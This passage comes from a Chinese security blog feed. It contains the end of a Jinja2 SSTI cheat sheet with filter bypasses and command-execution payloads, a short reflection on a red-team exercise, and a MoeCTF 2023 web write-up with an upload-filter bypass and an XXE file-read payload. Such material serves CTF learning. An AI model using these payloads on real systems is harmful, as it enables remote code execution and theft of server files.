class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>有一个很厉害的模块是<strong>buildtins</strong>里面有eval()等函数可以用来rce</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349815755-69fb51d9-5140-4b90-9be5-72c61c2cd7e0.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="SSTI常见的绕过方式"><a href="#SSTI常见的绕过方式" class="headerlink" title="SSTI常见的绕过方式"></a>SSTI常见的绕过方式</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过."></a>绕过.</h2><ol><li>前面也举了很多例子 可以用<code>[]</code>来代替</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__class&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><ol><li>可以用attr()过滤器</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过_"></a>绕过_</h2><ol><li>通过list获取字符列表，然后用pop来获取_ 其实就是去截_</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)%&#125;&#123;%<span class="built_in">print</span>(a)%&#125;</span><br></pre></td></tr></table></figure><ol><li>通过十六进制编码</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125; =&#123;&#123;().__class__&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过[]"></a>绕过[]</h2><p>可以使用__getitem__魔术方法 简单说就是把中括号转换为括号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__bases__[<span class="number">0</span>]=__bases__.__getitem__(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>其实本质是我们用[]的时候 调用的就是这个魔术方法而已</p><h2 id="绕过花括号"><a href="#绕过花括号" class="headerlink" title="绕过花括号"></a>绕过花括号</h2><p>可以用<code>&#123;%%&#125;</code>bypass 这时就要在里面用print()来打印结果了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]. __subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">修改为</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]. __subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure><p>也可以借助for循环和if语句来执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>注意这里循环语句 有<code>&#123;%for&#125;`就要有`&#123;%endfor%&#125;</code></p><p>有<code>&#123;%if&#125;` 就要有`&#123;%endif%&#125;</code></p><h2 id="绕过单引号和双引号"><a href="#绕过单引号和双引号" class="headerlink" title="绕过单引号和双引号"></a>绕过单引号和双引号</h2><p>当单引号和双引号被ban时，我们通常采用<code>request.args.a</code>，然后给a赋值这种方式来进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[request.args.a]&#125;&#125;&amp;a=__builtins__  等同于 &#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>原理</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692353373357-ff1aea78-b318-4a51-b0ae-8ed11fcc5d7b.png" alt="img"></p><p>如果args也被禁了</p><p>可以采用<code>request.cookies</code>和<code>request.values</code>，他们利用的方式大同小异</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:&#123;&#123;url_for.__globals__[request.cookies.a]&#125;&#125;</span><br><span class="line">COOkie: <span class="string">&quot;a&quot;</span> :<span class="string">&#x27;__builtins__&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="绕过数字"><a href="#绕过数字" class="headerlink" title="绕过数字"></a>绕过数字</h2><p>可以通过count来得到数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(<span class="built_in">dict</span>(e=a)|join|count)&#125;&#125; <span class="comment">#1</span></span><br><span class="line">&#123;&#123;(<span class="built_in">dict</span>(eee=a)|join|count)&#125;&#125;<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>在这里join将字典的键连接起来 然后count</p><h2 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h2><p>和上面相同的原理 join拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="built_in">dict</span>(__<span class="keyword">in</span>=a,it__=a)|join&#125;&#125;  =__init__</span><br></pre></td></tr></table></figure><h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、任意命令执行</span><br><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line"><span class="number">2</span>、任意命令执行</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]. __subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">//这个<span class="number">138</span>对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload</span><br><span class="line"><span class="number">3</span>、任意命令执行</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="number">4</span>、任意命令执行</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">//x的含义是可以为任意字母，不仅仅限于x</span><br><span class="line"><span class="number">5</span>、任意命令执行</span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="number">6</span>、文件读取</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br><span class="line">//x的含义是可以为任意字母，不仅仅限于x</span><br></pre></td></tr></table></figure><h1 id="后言："><a href="#后言：" class="headerlink" title="后言："></a>后言：</h1><p>做题慢慢补充</p><p>参考：<a href="https://tttang.com/archive/1698/#toc__4">https://tttang.com/archive/1698/#toc__4</a> </p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一次hwの经历</title>
      <link href="/post/ccf2062.html"/>
      <url>/post/ccf2062.html</url>
      
        <content type="html"><![CDATA[<p>突发恶疾</p><span id="more"></span><p>暑假到一半突然说要回学校参加hw，一开始在去与不去的纠结中，但是由于学习的好奇心驱使和难得的机会，最后还是报了名，虽然五天陪跑，干的都是纯纯的体力活，但是总体还是很不错的一次学习经历！</p><p>因为话题比较涉密，原谅没有图片的纯文字发病过程，请护眼。。。</p><h1 id="赛前"><a href="#赛前" class="headerlink" title="赛前"></a>赛前</h1><p>因为突然来消息没有提前买机票，隔几天买机票的话就很贵，花了我整整1500&#x2F;(ㄒoㄒ)&#x2F;~~ 穷狗的眼泪落了下来</p><p>然后就是回寝室，最恶心的是还要申请宿舍通水电，还要至少两个人在一个寝室，是牛魔脑子有病，都是成年人恶心人干嘛，好在是巧妙的化解了</p><p>不知道咋了回来我的小电瓶车它不动了，太夸张了，我的爹他不动了，修车的人因为是假期也不在，很难想象我是怎么在大热天里徒步在校园中穿梭，那共享车的车速和位置真的是太让人逆天不想碰。</p><p>总的一句话就是事事不顺。。。。 </p><p>不过这些问题都不大</p><h1 id="被-？围绕的五天"><a href="#被-？围绕的五天" class="headerlink" title="被 ？围绕的五天"></a>被 ？围绕的五天</h1><p>开始三天吧估计是，毫无头绪，一开始就是照着网上教程去收集子域名，收集ip，很费劲，好在好像是第二天，发了资产表，终于是有点系统性整理好的信息了</p><p>也是借着这次的hw，对于域名 子域名 ipc段 端口 fofa 宝塔等 有了更深的认识</p><p>弱口令感觉经过多次hw之后，相较于之前的话，会少很多，这次我找到的都是未授权访问，相较于弱口令，这次未授权访问的洞是更多的。</p><p>当然入口都是这些不起眼的小漏洞 但是就是因为这些小漏洞会引发一连串的效应  </p><p>而且如果弱口令不是类似于admin&#x2F;admin这样小白密码，那么要想通过社工管理员去针对的做一个密码本是比较困难和麻烦的。</p><p>其次就是要对已经收集的一些资产信息进行整理和统计，这样可以避免重复性操作，也会使得整个流程进行的更有条理</p><p>发力是在最后一天好像是找了三个未授权，然后其中一个里面有着40个摄像头美美的吃了一波分</p><p>参加hw的师傅们都太强了，我们学校的👴们也很🐂，都是大佬，羡慕捏，能和厉害的人一起学习真的是一件很cool的事情</p><p>其次还有意外的收获~</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>学习知识本就是个当孙子的过程，希望未来的自己也能够及时抓住机会，不要害怕失败吧，毕竟相比于成功在我身上失败总是来的更频繁些，但是能学到新东西，失败又如何呢。</p><p>Keep Hacking！</p>]]></content>
      
      
      <categories>
          
          <category> 感悟 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Moectf2023 WEB方向WP</title>
      <link href="/post/a19b908f.html"/>
      <url>/post/a19b908f.html</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><span id="more"></span><p>完善自己 新生赛都打不了一点</p><p>这次靶机开启方式不错捏 挺新颖的</p><h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>正常请求参数考点 payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /?UwU=u HTTP/1.1</span><br><span class="line">Host: localhost:63279</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: </span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: MoeBrowser</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: character=admin</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">Luv=u</span><br></pre></td></tr></table></figure><h1 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h1><p>pdf末尾有一串16进制码 转了就行</p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>随便注册个账号然后登录将cookie base64解码</p><p>改成如下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180097881-982b5602-aebd-40ce-a215-5f243a2b1000.png" alt="img"></p><p>然后打入cookie 访问&#x2F;flag 即可</p><h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>F12 找就有</p><h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>看清规则</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180247032-9cbf0e31-ac5e-45b7-abcd-3d1fd538f4f2.png" alt="img"></p><p>油门和抓地成反比例 方向要反打 其次要在0.5秒进行下一步 直接脚本梭哈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">s = session()</span><br><span class="line">url = <span class="string">&#x27;http://localhost:64026/&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">0</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">payload_1 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">1</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">0</span>&#125; <span class="comment">#弯道向左，抓地力太小了！</span></span><br><span class="line">payload_2 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:-<span class="number">1</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">0</span>&#125; <span class="comment">#弯道向右，抓地力太小了！ </span></span><br><span class="line">payload_3 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">0</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">1</span>&#125; <span class="comment">#弯道直行，保持这个速度</span></span><br><span class="line">payload_4 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">1</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">2</span>&#125; <span class="comment">#弯道向左，抓地力太大了！</span></span><br><span class="line">payload_5 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:-<span class="number">1</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">2</span>&#125;<span class="comment">#弯道向右，抓地力太大了！</span></span><br><span class="line">payload_6 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:-<span class="number">1</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">1</span>&#125; <span class="comment">#弯道向右，保持这个速度 </span></span><br><span class="line">payload_7 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">1</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">1</span>&#125; <span class="comment">#弯道向左，保持这个速度</span></span><br><span class="line">payload_8 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">0</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">2</span>&#125;<span class="comment">#弯道直行，抓地力太大了！</span></span><br><span class="line">payload_9 = &#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">0</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">0</span>&#125;<span class="comment">#弯道直行，抓地力太小了！</span></span><br><span class="line">r = s.post(url=url,data=payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;弯道向左，抓地力太小了！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_1)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道向右，抓地力太小了！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_2)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道直行，保持这个速度&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_3)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道向左，抓地力太大了！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_4)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道向右，抓地力太大了！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_5)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道向右，保持这个速度&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_6)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道向左，保持这个速度&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_7)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道直行，抓地力太大了！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_8)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道直行，抓地力太小了！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = s.post(url=url,data=payload_9)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692180361902-326ff3a2-3884-4558-8c29-bb6430ad1ae4.png" alt="img"></p><h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>给了源码upload.php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$targetDir = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">$allowedExtensions = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; isset($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    $file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $tmp_path = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($file[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; false, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件类型不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filesize($tmp_path) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; false, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件太大&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $fileName = $file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $fileNameParts = explode(<span class="string">&#x27;.&#x27;</span>, $fileName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($fileNameParts) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        $secondSegment = $fileNameParts[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> ($secondSegment !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; false, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; false, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $uploadFilePath = dirname(__FILE__) . <span class="string">&#x27;/&#x27;</span> . $targetDir . basename($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($tmp_path, $uploadFilePath)) &#123;</span><br><span class="line">        die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; true, <span class="string">&#x27;file_path&#x27;</span> =&gt; $uploadFilePath]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; false, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题一开始没做出来 有点被吓住了 后来发现没啥</p><p>比较重要的是这一块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$fileName = $file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">   $fileNameParts = explode(<span class="string">&#x27;.&#x27;</span>, $fileName);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (count($fileNameParts) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">       $secondSegment = $fileNameParts[<span class="number">1</span>];</span><br><span class="line">       <span class="keyword">if</span> ($secondSegment !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">           die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; false, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       die(json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; false, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后其实我们将上传文件改为1.png.php即可 他只会检测索引为1的后缀是否为png</p><p>可能是apache的文件名解析特性吧</p><h1 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h1><p>一道xxe</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE username [</span><br><span class="line">&lt;!ENTITY aaa SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt; ]&gt;</span><br><span class="line">&lt;xml&gt;&lt;name&gt;&amp;aaa;&lt;/name&gt;&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>值得注意的是要url编码后打入 不然没结果 </p><h1 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h1><p><code>?id=1</code>1-1000直接bp爆破就行了 </p><h1 id="大海捞针-1"><a href="#大海捞针-1" class="headerlink" title="大海捞针"></a>大海捞针</h1><p>表面是文件上传其实就是文件包含 然后就是hash处理缺陷 数组绕过就行 经典题型了</p><h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" 